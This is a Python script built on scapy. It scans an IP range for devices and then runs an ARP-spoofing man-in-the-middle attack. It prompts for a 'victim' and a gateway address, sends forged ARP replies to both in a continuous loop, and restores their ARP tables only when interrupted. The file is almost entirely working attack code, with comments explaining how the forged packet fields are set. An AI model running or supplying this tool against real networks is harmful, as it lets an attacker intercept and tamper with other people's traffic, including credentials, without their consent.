#! /usr/bin/env python 
from os import  system, name
import sys
import time 
import scapy.all as sc
import argparse as ap

def get_args():                                     # Def to get the IP address from the user 
    obj = ap.ArgumentParser()
    obj.add_argument("-i", "--ip", dest="address", help="IP range with subnet")
    opts = obj.parse_args()
    if not opts.address:
        obj.error("[-] Please mention an IP range. [-]")
    return opts

def arp_scan(ip):                                   # Def to generate ARP request
    req = sc.ARP(pdst=ip)                           #ARP request
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")   #Broadcast signal
    arp_broadcast = broadcast/req                   #Add ARP request and broadcast signal together
    ans = sc.srp(arp_broadcast, timeout=1, verbose=False)[0]  # making list answered to filter out the required part.

    dev_list = []
    for e in  ans:
        dev_dict = {"ip" : e[1].psrc, "mac" : e[1].hwsrc}
        dev_list.append(dev_dict) 
    return  (dev_list)


def print_res(res):       # Def to print the output of the devices found 
    print("\n[+] Listing devices on the network")
    print("IP Address\t\t\tMAC Address")
    print("\n-------------------------------------------------------------------------------")
    for dev in res:
        print(dev["ip"] + "\t\t" + dev["mac"])          # Print from dictionary for ip and mac
        print("-------------------------------------------------------------------------------") 


def find_mac(ip):                                   # Def to generate find MAC of the target machine 
    req = sc.ARP(pdst=ip)                           #ARP request
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")   #Broadcast signal
    arp_broadcast = broadcast/req                   #Add ARP request and broadcast signal together
    ans = sc.srp(arp_broadcast, timeout=1, verbose=False)[0]  #making list answered to filter out the required part.
    return ans[0][1].hwsrc                                    # Setting this as 0 since we will be asking for only one IP and that will be the one we need.


def arp_spoofer(victim_ip, gateway_ip):            # Def to spoof ARP requests 
    router_mac = find_mac(victim_ip)
    pkt = sc.ARP(op=2, pdst=victim_ip, hwdst=router_mac, psrc=gateway_ip)
    """
    - op is set to 1 by default so it creates an ARP request but we want to  create an ARP response so we set op to 2 
    - pdst is the IP address of our victim machine 
    - hwdst is the MAC of our victim machine. All the above information can be found out with the network scanner
    - psrc is the IP of the default gateway of the router.
    - All these fields in scapy can be checked using importing scapy.all in python shell and then doing sc.ls(sc.ARP)
     """
    sc.send(pkt, verbose=False)

def restore_table(dest_ip, src_ip):             # Def to restore the ARP table after the attack is over. 
    dest_mac = find_mac(dest_ip)
    src_mac = find_mac(src_ip)
    rst_pkt = sc.ARP(op=2, pdst=dest_ip, hwdst= dest_mac, psrc=src_ip, hwsrc=src_mac)
    sc.send(rst_pkt, count=4, verbose=False)


opts = get_args()
scan_res = arp_scan(opts.address)
print_res(scan_res)


def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

vic_ip = input("[+] Enter the victim IP address: ")
gate_ip = input("[+] Enter the gateway IP address: ")
clear()

counter = 0
try:
    while (True):                                                    # While loop so that it continues to send packets till we don't stop it.
        arp_spoofer(vic_ip, gate_ip)
        arp_spoofer(gate_ip, vic_ip)
        counter += 2
        print("\r[+] Packets sent: " + str(counter), end="")        #Dynamic printing on python3
        # sys.stdout.write("\r[+] Packets sent: " + str(counter))   # If you are old school 
        time.sleep(3)
except KeyboardInterrupt:
    print("\n[-] KeyboardInterrupt detected. Exiting. ")
    print("\n[-] Cleaning up... ")                                  # Restoring original IP table 
    restore_table(vic_ip, gate_ip)
    restore_table(gate_ip, vic_ip)

